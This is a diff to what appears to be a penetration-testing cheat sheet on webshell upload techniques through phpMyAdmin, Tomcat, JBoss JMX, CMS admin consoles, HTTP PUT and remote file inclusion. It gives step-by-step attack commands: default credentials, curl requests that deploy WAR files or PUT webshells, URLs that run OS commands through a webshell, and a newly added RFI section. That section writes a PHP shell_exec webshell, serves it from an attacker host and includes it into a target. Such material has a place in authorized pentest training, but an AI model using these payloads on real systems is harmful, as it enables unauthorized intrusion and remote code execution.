@@ -2,22 +2,22 @@
 
 #### Classic Webshell upload techniques
 ```
-1. Webshell upload using a PHPMyAdmin Web console
-2. Webshell upload using an Apache Tomcat manager Web console
-3. Webshell upload using a JBoss administration JMX console
-4. Webshell upload using a WebLogic administration console
-5. Webshell upload using a CMS Website admin console (e.g., WordPress)
-6. Webshell upload by abusing the insecure HTTP PUT method
-7. Webshell upload by exploiting a Website vulnerability such as:
-   - Remote File Include vulnerability
-   - Vulnerable file upload function
-   - SQL injection (e.g., MS SQL database server and xp_cmdshell)
-   - OS command execution flaw
-   - Remote Code Execution vulnerability
-   - ...
-8. Webshell upload using a Lotus Domino admin console
-9. Webshell upload using a Jenkins admin console
-10. ...
+Technique 1. Webshell upload using a PHPMyAdmin Web console
+Technique 2. Webshell upload using an Apache Tomcat manager Web console
+Technique 3. Webshell upload using a JBoss administration JMX console
+Technique 4. Webshell upload using a WebLogic administration console
+Technique 5. Webshell upload using a CMS Website admin console (e.g., WordPress)
+Technique 6. Webshell upload by abusing the insecure HTTP PUT method
+Technique 7. Webshell upload by exploiting a Website vulnerability such as:
+	     - Remote File Include vulnerability
+	     - Vulnerable file upload function
+	     - SQL injection (e.g., MS SQL database server and xp_cmdshell)
+	     - OS command execution flaw
+	     - Remote Code Execution vulnerability
+	     - ...
+Technique 8. Webshell upload using a Lotus Domino admin console
+Technique 9. Webshell upload using a Jenkins admin console
+Technique 10. ...
 ```
 ##### Technique 1 - PHPMyAdmin Web console
 ```
@@ -56,13 +56,12 @@
 
 ➤ Step 3. Then go to the application section to see the details about your new deployed application (e.g. path, start/stop/reload/undeploy buttons etc.)
 
-➤ Step 4. Execute OS command using the Webshell 
+➤ Step 4. Execute OS commands using the Webshell 
           - Examples: 
 	    + http://target_IP:port/<path>/webshell.jsp?cmd=whoami
 	    + http://target_IP:port/webshell/webshell.jsp?cmd=whoami
-
 ```
-
+ 
 <i>Example - How to create a WAR file</i>
 ```
 1. Choose a Web shell (.jsp)
@@ -106,6 +105,8 @@
 
 ##### Technique 3 - JBoss Administration JMX console
 ```
+Example 1
+---------
 ➤ Step 1. Log into the JBoss JMX console by exploiting the presence of default or easy guessable credentials,
 	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
 	  - Default or weak credentials: admin:admin, sysadmin:sysadmin, ...
@@ -134,10 +135,10 @@
           - Examples: 
 	    + http://x.x.x.x:8080/webshell/webshell.jsp?cmd=whoami&html=true
 	    + http://x.x.x.x:9090/webshell/webshell.jsp?cmd=whoami
-
-
-Other exploitation examples
----------------------------
+```
+```
+Example 2
+---------
 ➤ Step 1. On the command line, type the following cURL request (wrapped for better readability) to deploy a WAR file using the JMX Console:
           $ curl ’http://x.x.x.x:8080/jmx-console/HtmlAdaptor
           ?action=invokeOpByName
@@ -191,7 +192,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
           On the contrary, if the Deployment Status is false and the Deployment Activity is “Running…”, it indicates that deployment is ‘in progress’. 
           In such a case, wait until the status changes.
 	  
-➤ Step 7. Execute OS command using the Webshell 
+➤ Step 7. Execute OS commands using the Webshell 
           - Example: http://target_IP/<path>/webshell.jsp?cmd=whoami
 ```
 
@@ -249,7 +250,7 @@ Example 2 - Kentico
           - curl -T webshell.aspx http://www.sitename.com/<path>
           - curl -T webshell.php http://www.sitename.com/<path>
  
-➤ Step 5. Execute OS command using the Webshell 
+➤ Step 5. Execute OS commands using the Webshell 
           Examples: 
           - http://www.sitename.com/<path>/webshell.jsp?cmd=whoami
           - http://www.sitename.com/<path>/webshell.asp?cmd=whoami
@@ -257,3 +258,21 @@ Example 2 - Kentico
           - ...
 ```
 
+##### Technique 7. Webshell upload by exploiting a RFI vulnerability
+```
+Example
+➤ Step 1. Review the content (php settings) of the page "/phpinfo.php" (e.g., identified with dirbuster)
+     	   => allow_url_fopen   : On  => potential RFI
+     	   => allow_url_include : On  => potential RFI	
+
+➤ Step 2. Create a webshell and host it on a publicly availble Web server
+          Examples:
+	  - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell.php
+	  - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell
+	  - jeff@kali:~/$ sudo python3 -m http.server 80
+
+➤ Step 3. Find and exploit a Remote File Include (RFI) flaw using Burp proxy to execute OS commands with your webshell
+          Example:
+          - http://Website/index.php?p=http://x.x.x.x/webshell.php
+	  - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
+```
